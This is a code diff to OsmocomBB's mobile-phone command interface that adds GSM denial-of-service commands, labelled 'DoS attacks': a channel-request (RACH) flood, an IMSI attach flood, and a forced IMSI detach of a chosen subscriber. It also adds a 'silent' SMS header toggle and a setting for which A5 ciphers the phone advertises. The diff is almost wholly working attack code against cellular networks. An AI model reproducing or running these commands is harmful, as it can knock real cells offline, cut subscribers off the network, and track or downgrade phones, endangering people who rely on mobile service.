@@ -40,6 +40,7 @@
 #include <osmocom/bb/mobile/app_mobile.h>
 #include <osmocom/bb/mobile/gsm480_ss.h>
 #include <osmocom/bb/mobile/gsm411_sms.h>
+#include <osmocom/bb/mobile/dos.h>
 #include <osmocom/vty/telnet_interface.h>
 
 void *l23_ctx;
@@ -53,6 +54,9 @@ int mncc_dtmf(struct osmocom_ms *ms, char *dtmf);
 
 extern struct llist_head ms_list;
 extern struct llist_head active_connections;
+
+extern int gsm48_mm_dos_detach(struct osmocom_ms *ms);
+extern int gsm48_rr_dos_rach(struct osmocom_ms *ms);
 
 struct cmd_node ms_node = {
 	MS_NODE,
@@ -863,6 +867,69 @@ DEFUN(call_dtmf, call_dtmf_cmd, "call MS_NAME dtmf DIGITS",
 	return CMD_SUCCESS;
 }
 
+DEFUN(crypt_support, crypt_support_cmd, "encryption MS_NAME A5/1 A5/2 A5/3 A5/4 A5/5 A5/6 A5/7",
+	"Set the encryption support advertised by the ms\n"
+	"Name of MS (see \"show ms\")\n"
+	"1 for supporting, 0 for not supporting\n"
+	"1 for supporting, 0 for not supporting\n"
+	"1 for supporting, 0 for not supporting\n"
+	"1 for supporting, 0 for not supporting\n"
+	"1 for supporting, 0 for not supporting\n"
+	"1 for supporting, 0 for not supporting\n"
+	"1 for supporting, 0 for not supporting\n")
+{
+	struct osmocom_ms *ms;
+	struct gsm_settings *set;
+
+	ms = get_ms(argv[0], vty);
+	if (!ms)
+		return CMD_WARNING;
+	set = &ms->settings;
+
+	if(argc>1 && atoi(argv[1]))
+		set->a5_1 = 1;
+	if(argc>2 && atoi(argv[2]))
+		set->a5_2 = 1;
+	if(argc>3 && atoi(argv[3]))
+		set->a5_3 = 1;
+	if(argc>4 && atoi(argv[4]))
+		set->a5_4 = 1;
+	if(argc>5 && atoi(argv[5]))
+		set->a5_5 = 1;
+	if(argc>6 && atoi(argv[6]))
+		set->a5_6 = 1;
+	if(argc>7 && atoi(argv[7]))
+		set->a5_7 = 1;
+
+	return CMD_SUCCESS;
+}
+
+DEFUN(silent, silent_cmd, "silent TP-PID TP-DCS",
+	"Set SMS messages header\n"
+	"1 for 0x40, 0 for default\n"
+	"1 for 0xC0, 0 for default\n")
+{
+	int pid;
+	int dcs;
+
+	if (argc >= 1) {
+		pid = atoi(argv[0]);
+		dcs = atoi(argv[1]);
+		if (pid) {
+			silent_sms.pid = 1;
+		} else {
+			silent_sms.pid = 0;
+		}
+		if (dcs) {
+			silent_sms.dcs = 1;
+		} else {
+			silent_sms.dcs = 0;
+		}
+	}
+
+	return CMD_SUCCESS;
+}
+
 DEFUN(sms, sms_cmd, "sms MS_NAME NUMBER .LINE",
 	"Send an SMS\nName of MS (see \"show ms\")\nPhone number to send SMS "
 	"(Use digits '0123456789*#abc', and '+' to dial international)\n"
@@ -1039,6 +1106,190 @@ DEFUN(network_search, network_search_cmd, "network search MS_NAME",
 	if (!nmsg)
 		return CMD_WARNING;
 	gsm322_plmn_sendmsg(ms, nmsg);
+
+	return CMD_SUCCESS;
+}
+
+DEFUN(dos_camp, dos_camp_cmd,
+	"dos camp MS_NAME [MCC] [MNC] [LAC] [TMSI]",
+	"DoS attacks\nCamp on a given network\n"
+	"Name of MS (see \"show ms\")\n"
+	"Optionally set mobile Country Code of RPLMN\n"
+	"Optionally set mobile Network Code of RPLMN\n"
+	"Optionally set location area code of RPLMN\n"
+	"Optionally set current assigned TMSI")
+{
+	struct osmocom_ms *ms;
+	struct gsm_settings *set;
+
+	ms = get_ms(argv[0], vty);
+	if (!ms)
+		return CMD_WARNING;
+
+	set = &ms->settings;
+	if(!set->test_rplmn_valid) {
+		vty_out(vty, "Need to set a test rplmn first.%s", VTY_NEWLINE);
+		return CMD_WARNING;
+	}
+
+	dos.camp = 1;
+
+	dos.rach = 0;
+	dos.attach = 0;
+	dos.detach = 0;
+
+	dos.t3211_sec = 15;
+	dos.t3211_msec = 0;
+
+	dos.max_retrans = 0;
+
+	return _sim_test_cmd(vty, argc, argv, 0);
+}
+
+DEFUN(dos_rach, dos_rach_cmd, "dos rach [MS_NAME] <1-65535>",
+	"DoS attacks\n""Channel Request flood\n"
+	"Name of MS (see \"show ms\")\n"
+	"Set max number of retransmissions\n")
+{
+	struct osmocom_ms *ms;
+	int retrans;
+
+	ms = get_ms(argv[0], vty);
+	if (!ms)
+		return CMD_WARNING;
+
+	if (argc >= 2) {
+		retrans = atoi(argv[1]);
+	} else {
+		vty_out(vty, "Need to set a retransmission number%s", VTY_NEWLINE);
+		return CMD_WARNING;
+	}
+
+	if (!dos.camp) {
+		vty_out(vty, "Need to camp first (see \"dos camp\")%s", VTY_NEWLINE);
+		return CMD_WARNING;
+	}
+
+	dos.rach = 1;
+	dos.attach = 0;
+	dos.detach = 0;
+
+	dos.t3211_sec = 15;
+	dos.t3211_msec = 0;
+
+	dos.max_retrans = retrans;
+
+	gsm48_rr_dos_rach(ms);
+
+	return CMD_SUCCESS;
+}
+
+DEFUN(dos_attach, dos_attach_cmd, "dos attach [MS_NAME] [MCC] [MNC] <0-65535> <0-65535>",
+	"DoS attacks\n""IMSI attach flood\n"
+	"Name of MS (see \"show ms\")\n"
+	"Mobile Country Code\n"
+	"Mobile Network Code\n"
+	"Set loc. upd. retry delay in seconds.\n"
+	"Set loc. upd. retry delay in micro seconds.\n")
+{
+	struct osmocom_ms *ms;
+	struct gsm_settings *set;
+	uint16_t mcc = 0, mnc = 0, seconds = 15, mseconds = 0;
+
+	ms = get_ms(argv[0], vty);
+	if (!ms)
+		return CMD_WARNING;
+
+	set = &ms->settings;
+
+	if (argc >= 4) {
+
+		mcc = gsm_input_mcc((char *)argv[1]);
+		mnc = gsm_input_mnc((char *)argv[2]);
+		seconds = atoi(argv[3]);
+		if (argc >= 5)
+			mseconds = atoi(argv[4]);
+
+		if (mcc == GSM_INPUT_INVALID) {
+			vty_out(vty, "Given MCC invalid%s", VTY_NEWLINE);
+			return CMD_WARNING;
+		}
+		if (mnc == GSM_INPUT_INVALID) {
+			vty_out(vty, "Given MNC invalid%s", VTY_NEWLINE);
+			return CMD_WARNING;
+		}
+		if (seconds < 0 || seconds > 65535) {
+			vty_out(vty, "Given seconds delay invalid%s", VTY_NEWLINE);
+			return CMD_WARNING;
+		}
+		if (mseconds < 0 || mseconds > 65535) {
+			vty_out(vty, "Given micro seconds delay invalid%s", VTY_NEWLINE);
+			return CMD_WARNING;
+		}
+
+	} else {
+		vty_out(vty, "Not enough arguments%s", VTY_NEWLINE);
+		return CMD_WARNING;
+	}
+
+	if(!set->test_rplmn_valid) {
+		vty_out(vty, "Need to set a test rplmn first.%s", VTY_NEWLINE);
+		return CMD_WARNING;
+	}
+
+	dos.rach = 0;
+	dos.attach = 1;
+	dos.detach = 0;
+
+	dos.t3211_sec = seconds;
+	dos.t3211_msec = mseconds;
+
+	dos.max_retrans = 0;
+
+	gsm_subscr_testcard(ms, mcc, mnc, 0, 0xffffffff, 0);
+
+	return CMD_SUCCESS;
+}
+
+DEFUN(dos_detach, dos_detach_cmd, "dos detach [MS_NAME] [IMSI]",
+	"DoS attacks\n""IMSI detach\n"
+	"Name of MS (see \"show ms\")\n")
+{
+	struct osmocom_ms *ms;
+	struct gsm_subscriber *subscr;
+	char *error;
+
+	ms = get_ms(argv[0], vty);
+	if (!ms)
+		return CMD_WARNING;
+
+	subscr = &ms->subscr;
+
+	if (argc >= 2) {
+		error = gsm_check_imsi(argv[1]);
+		if (error) {
+			vty_out(vty, "%s%s", error, VTY_NEWLINE);
+			return CMD_WARNING;
+		}
+	}
+
+	if (!dos.camp) {
+		vty_out(vty, "Need to camp first (see \"dos camp\")%s", VTY_NEWLINE);
+		return CMD_WARNING;
+	}
+
+	dos.rach = 0;
+	dos.attach = 0;
+	dos.detach = 1;
+
+	dos.t3211_sec = 15;
+	dos.t3211_msec = 0;
+
+	dos.max_retrans = 0;
+
+	strcpy(subscr->imsi, argv[1]);
+
+	gsm48_mm_dos_detach(ms);
 
 	return CMD_SUCCESS;
 }
@@ -2817,9 +3068,16 @@ int ms_vty_init(void)
 	install_element(ENABLE_NODE, &call_retr_cmd);
 	install_element(ENABLE_NODE, &call_dtmf_cmd);
 	install_element(ENABLE_NODE, &sms_cmd);
+	install_element(ENABLE_NODE, &silent_cmd);
+	install_element(ENABLE_NODE, &crypt_support_cmd);
 	install_element(ENABLE_NODE, &service_cmd);
 	install_element(ENABLE_NODE, &test_reselection_cmd);
 	install_element(ENABLE_NODE, &delete_forbidden_plmn_cmd);
+
+	install_element(ENABLE_NODE, &dos_camp_cmd);
+	install_element(ENABLE_NODE, &dos_rach_cmd);
+	install_element(ENABLE_NODE, &dos_attach_cmd);
+	install_element(ENABLE_NODE, &dos_detach_cmd);
 
 #ifdef _HAVE_GPSD
 	install_element(CONFIG_NODE, &cfg_gps_host_cmd);
